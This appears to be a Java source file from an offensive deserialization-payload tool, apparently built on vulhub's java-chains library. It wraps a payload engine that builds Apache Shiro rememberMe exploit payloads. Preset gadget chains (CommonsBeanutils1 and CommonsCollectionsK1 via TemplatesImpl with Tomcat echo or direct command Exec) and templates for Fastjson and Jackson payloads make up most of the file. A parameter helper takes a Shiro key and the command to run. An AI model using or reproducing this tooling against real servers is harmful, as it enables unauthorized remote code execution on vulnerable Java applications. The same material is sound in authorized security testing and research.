package shiro;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.vulhub.javachains.common.GadgetParam;
import payload.PayloadEngine;
import payload.PayloadResult;

/**
 * Shiro 侧的链封装：只保留 Shiro 专属内容（预置链模板与默认参数），
 * 通用实现（载体重目录、节点导航、参数查询、载荷构建）全部委派给 {@code payload.PayloadEngine}。
 *
 * <p>这样拆分的理由：载体枚举、节点导航与载荷构建与漏洞类型无关，属通用能力；
 * 留在本模块会让其它功能无法复用，也会让「通用组件依赖具体功能模块」的反向耦合长期存在。
 *
 * <p>公开方法签名与 {@link Generated} 嵌套类型保持不变，既有调用方零改动。
 */
public final class ChainsEngine {

    /** 界面展示用的预置链模板。 */
    public static final class ChainTemplate {
        public final String name;
        public final String description;
        public final String payload;
        public final List<String> gadgets;

        public ChainTemplate(String name, String description, String payload, List<String> gadgets) {
            this.name = name;
            this.description = description;
            this.payload = payload;
            this.gadgets = Collections.unmodifiableList(new ArrayList<String>(gadgets));
        }
    }

    /** payload 构建结果。字段与语义保持不变，内部由 {@link PayloadResult} 适配而来。 */
    public static final class Generated {
        public boolean success;
        public String message = "";
        public String payload = "";
        public int byteLength;

        public static Generated fail(String message) {
            Generated generated = new Generated();
            generated.success = false;
            generated.message = message;
            return generated;
        }

        public static Generated ok(String payload) {
            Generated generated = new Generated();
            generated.success = true;
            generated.payload = payload == null ? "" : payload;
            generated.byteLength = generated.payload.length();
            generated.message = "payload 生成成功，长度 " + generated.byteLength + " 字符。";
            return generated;
        }
    }

    private ChainsEngine() {
    }

    /** 初始化引擎；委派给通用引擎，本类不再持有初始化状态。 */
    public static void init() {
        PayloadEngine.init();
    }

    public static boolean isReady() {
        return PayloadEngine.isReady();
    }

    public static String statusMessage() {
        return PayloadEngine.statusMessage();
    }

    /** 全部节点 id（含 payload 与 gadget），按字母排序。 */
    public static List<String> nodeIds() {
        return PayloadEngine.nodeIds();
    }

    /** 所有 payload 载体 id。 */
    public static List<String> payloadIds() {
        return PayloadEngine.payloadIds();
    }

    /** 查询某个节点的可配置参数。 */
    public static List<GadgetParam> paramsOf(String nodeId) {
        return PayloadEngine.paramsOf(nodeId);
    }

    /** 查询某个节点之后可以继续追加的节点 id。 */
    public static List<String> nextNodes(String nodeId) {
        return PayloadEngine.nextNodes(nodeId);
    }

    /**
     * 构建 payload。
     *
     * <p>失败结论仍以 {@link Generated#message} 暴露：Shiro 侧的调用方与自检都依赖这两个字段，
     * 因此这里做一次适配，而不是把通用结果类型直接抛给它们。
     */
    public static Generated build(String payloadId, List<String> gadgets, Map<String, Object> params) {
        PayloadResult result = PayloadEngine.build(payloadId, gadgets, params);
        if (!result.success) return Generated.fail(result.message);
        return Generated.ok(result.base64);
    }

    /** 把参数名归一化：既接受 {@code Exec.cmd}，也接受 {@code cmd}。 */
    public static Map<String, Object> normalizeParams(Map<String, String> raw) {
        return PayloadEngine.normalizeParams(raw);
    }

    /** 内置预置链：覆盖 Shiro 场景下最常用的几条。 */
    public static List<ChainTemplate> templates() {
        List<ChainTemplate> templates = new ArrayList<ChainTemplate>();
        templates.add(new ChainTemplate("Shiro + CB1 回显",
                "CommonsBeanutils1 → TemplatesImpl → BytecodeConvert → TomcatEcho，命中后按请求头回显命令结果。",
                "shiropayload",
                java.util.Arrays.asList("commonsbeanutils1", "templatesimpl", "bytecodeconvert", "tomcatecho")));
        templates.add(new ChainTemplate("Shiro + CCK1 回显",
                "CommonsCollectionsK1 → TemplatesImpl → BytecodeConvert → TomcatEcho，适合 CC 依赖环境。",
                "shiropayload",
                java.util.Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "tomcatecho")));
        templates.add(new ChainTemplate("Shiro + CCK1 命令执行",
                "CommonsCollectionsK1 → TemplatesImpl → BytecodeConvert → Exec，直接执行单条命令。",
                "shiropayload",
                java.util.Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "exec")));
        templates.add(new ChainTemplate("Shiro 探测链",
                "CommonsCollectionsK1，仅验证密钥是否可解密（不执行任何代码）。",
                "shiropayload",
                Collections.singletonList("commonscollectionsk1")));
        templates.add(new ChainTemplate("Fastjson 回显",
                "fastjsonpayload → exec，生成 Fastjson 反序列化载荷。",
                "fastjsonpayload",
                Collections.singletonList("exec")));
        templates.add(new ChainTemplate("Jackson 回显",
                "javanativepayload → jackson 系节点，生成 Jackson 反序列化载荷。",
                "javanativepayload",
                Collections.singletonList("commonscollectionsk1")));
        return templates;
    }

    /** 生成常用参数模板：{@code Exec.cmd} 与 Shiro 密钥。 */
    public static Map<String, String> defaultParams(String payloadId, boolean gcm, String shiroKey, String command) {
        Map<String, String> params = new LinkedHashMap<String, String>();
        if ("shiropayload".equalsIgnoreCase(payloadId)) {
            params.put("ShiroPayload.shiroKey", shiroKey == null ? "" : shiroKey);
            params.put("ShiroPayload.gcmMode", String.valueOf(gcm));
            params.put("ShiroPayload.dirtyLength", "0");
        }
        if (command != null && !command.trim().isEmpty()) params.put("Exec.cmd", command.trim());
        return params;
    }

    /** 异常信息扁平化，便于界面直接展示。 */
    private static String describe(Throwable error) {
        Throwable cause = error;
        while (cause.getCause() != null && cause.getCause() != cause) cause = cause.getCause();
        String message = cause.getMessage();
        if (message == null || message.trim().isEmpty()) return cause.getClass().getSimpleName();
        return cause.getClass().getSimpleName() + ": " + message;
    }
}
